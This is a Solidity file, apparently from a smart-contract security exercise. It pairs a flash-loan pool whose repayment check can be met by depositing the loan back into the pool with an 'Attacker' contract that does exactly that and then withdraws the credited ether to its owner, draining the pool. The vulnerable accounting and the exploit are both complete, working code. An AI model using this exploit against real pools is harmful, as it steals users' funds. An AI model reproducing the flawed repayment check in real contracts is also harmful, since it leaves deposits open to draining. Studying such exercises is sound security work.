// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Address} from "./Utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract Web3BridgeCXIPool {
    using Address for address payable;

    mapping(address => uint256) private balances;

    error NotEnoughETHInPool();
    error FlashLoanHasNotBeenPaidBack();

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        if (balanceBefore < amount) revert NotEnoughETHInPool();

        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert FlashLoanHasNotBeenPaidBack();
        }
    }
}

contract Attacker is IFlashLoanEtherReceiver {
    // using Address for address payable;

    Web3BridgeCXIPool pool;

    address owner;

    constructor(address _pool) {
        pool = Web3BridgeCXIPool(_pool);
        owner = msg.sender;
    }

    function onlyOwner() private view {
        require(msg.sender == owner, "only owner");
    }

    function withdraw() public {
        onlyOwner();
        pool.withdraw();
        uint256 bal = address(this).balance;
        (bool success, ) = owner.call{value: bal}("");
        require(success, "failed withdraw");
    }

    function execute() external payable override {
        // do some stuff

        // return funds to pool
        // uint256 bal = address(this).balance;
        // (bool success, ) = address(pool).call{value: bal}("");
        // require(success, "execution failed");
        uint256 bal = address(this).balance;
        pool.deposit{value: bal}();
    }

    function initiateFlashLoan() public {
        pool.flashLoan(address(pool).balance);
    }

    receive() external payable {}
}
